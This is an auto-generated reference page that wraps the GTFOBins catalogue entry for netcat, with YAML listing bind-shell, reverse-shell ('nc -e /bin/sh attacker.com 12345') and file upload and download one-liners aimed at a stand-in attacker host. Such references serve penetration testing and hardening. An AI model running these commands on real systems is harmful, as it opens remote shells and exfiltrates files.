---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# nc

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `nc` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [nc](../../tools/linux/nc.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | nc |
| name | nc |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/nc/ |

## Preserved Source Material

```yaml
_body: ''
_name: nc
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nc
functions:
  bind-shell:
  - code: nc -l -p 12345 -e /bin/sh
    comment: This only works with netcat traditional.
    connector: tcp-client
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  download:
  - code: nc -l -p 12345 >/path/to/output-file
    comment: The file is actually written by the invoking shell.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tcp-client
  - code: nc attacker.com 12345 >/path/to/output-file
    comment: The file is actually written by the invoking shell.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tcp-server
  reverse-shell:
  - code: nc -e /bin/sh attacker.com 12345
    comment: This only works with netcat traditional.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    listener: tcp-server
  upload:
  - code: nc -l -p 12345 </path/to/input-file
    comment: The file is actually read by the invoking shell.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-client
  - code: nc attacker.com 12345 </path/to/input-file
    comment: The file is actually read by the invoking shell.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-server
```
